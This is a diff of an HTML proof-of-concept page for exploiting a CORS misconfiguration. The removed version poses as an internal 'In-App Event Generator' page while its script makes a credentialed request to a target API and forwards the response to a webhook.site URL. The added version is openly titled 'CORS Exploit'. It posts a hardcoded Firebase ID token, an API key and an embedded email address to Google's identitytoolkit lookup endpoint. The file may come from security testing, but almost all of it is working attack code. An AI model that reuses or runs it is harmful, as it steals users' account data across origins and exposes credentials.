@@ -1,38 +1,24 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>In-App Event Generator</title>
-    <script>
-        // Exploit code
-        // Replace YOUR-UNIQUE-ID with your actual Webhook.site unique ID
-        fetch("https://api.company-target.com/api/v3/ip.json", {
-            method: "POST",
-            credentials: "include",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                src: "tag",
-                auth: "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Leaked Data:", data);
-            // Exfiltrate to a webhook
-            fetch("https://webhook.site/90a9a04b-72c9-4653-a2c2-f0a66c64559c", {
-                method: "POST",
-                body: JSON.stringify(data),
-                headers: { "Content-Type": "application/json" }
-            });
-        })
-        .catch(error => console.error("Error fetching API data:", error));
-    </script>
+  <title>CORS Exploit</title>
 </head>
 <body>
-    <h1>In-App Event Generator</h1>
-    <p>This page is for internal testing purposes.</p>
+  <h1>Testing CORS Misconfiguration</h1>
+  <script>
+    fetch('https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyC7J-OjmaQ6igkRmD5KNq2ZjbBDNgVNcIg', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Client-Version': 'Firefox/JsCore/9.23.0/FirebaseCore-web',
+        'X-Firebase-Gmpid': '1:23092714539:web:301a575dc5381b26689e6e',
+      },
+      body: JSON.stringify({
+        idToken: "eyJhbGciOiJSUzI1NiIsImtpZCI6IjkyODg2OGRjNDRlYTZhOThjODhiMzkzZDM2NDQ1MTM2NWViYjMwZDgiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcm9ib3NoYWRvdy1uZXR3b3JrLXNjYW5uZXIiLCJhdWQiOiJyb2Jvc2hhZG93LW5ldHdvcmstc2Nhbm5lciIsImF1dGhfdGltZSI6MTczMjIwMjM2NywidXNlcl9pZCI6IndQM2ZRRGtVc0FZeGlQNUVScU1UaFppNkg2MjMiLCJzdWIiOiJ3UDNmUURrVXNBWXhpUDVFUnFNVGhaaTZINjIzIiwiaWF0IjoxNzMyMjAyMzY3LCJleHAiOjE3MzIyMDU5NjcsImVtYWlsIjoibXNtc21zQGZtZi5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsibXNtc21zQGZtZi5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.BnNctYYxVl5ph00qWQnbcDTyBC9oz1hWzSDrHIopUcHNhADIYgI7IaVd5Th2vZZDVVCCWdB1TBamOaPSrXodELSN7M_eEPlWdmX1yErZznUV2bJkFkHi_dKrrIu3IomV-aJFGjCsNGEx7FzuUpxSY20XwO3lVMF7kg2Sv0kCLRqTPMXutZolY1-PoL_PtZelKNoTeXHQe5FvbSFQxUipKNffxGD-qYmJHr0Um9_vZ_rE1tp3jECU17ftzpJBpHhuqGrLor0an4q57SybVRaFW0zqkk7vzzZ4GciE1G3VrER3Z1BtQ79Z4OlUMZgPgQYCg6thvtYty7AZgpzcPrCtDg" // Replace with a valid token of the victim
+      }),
+    })
+      .then(response => response.json())
+      .then(data => console.log('Leaked Data:', data))
+      .catch(error => console.error('Error:', error));
+  </script>
 </body>
 </html>
